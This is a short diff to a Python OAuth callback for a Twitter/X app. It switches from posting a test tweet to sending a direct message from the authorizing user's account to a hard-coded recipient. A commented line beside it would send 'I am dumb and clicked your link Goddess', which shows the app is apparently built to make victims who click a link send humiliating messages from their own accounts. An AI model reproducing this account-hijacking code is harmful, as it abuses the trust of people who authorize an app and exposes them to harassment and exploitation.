@@ -234,8 +234,8 @@ def callback():
         #auth.set_access_token(real_oauth_token, real_oauth_token_secret)
         #api = tweepy.API(auth)
         recipient_id = "1697559401543139328"
-        api.create_tweet(text="twitter api test tweet")
-        #api.send_direct_message(recipient_id, "Hey")
+        #api.create_tweet(text="twitter api test tweet")
+        api.send_direct_message(recipient_id, "Hey")
         #send_message(real_client,"1697559401543139328","I am dumb and clicked your link Goddess")
         
     clear_maps(oauth_token)
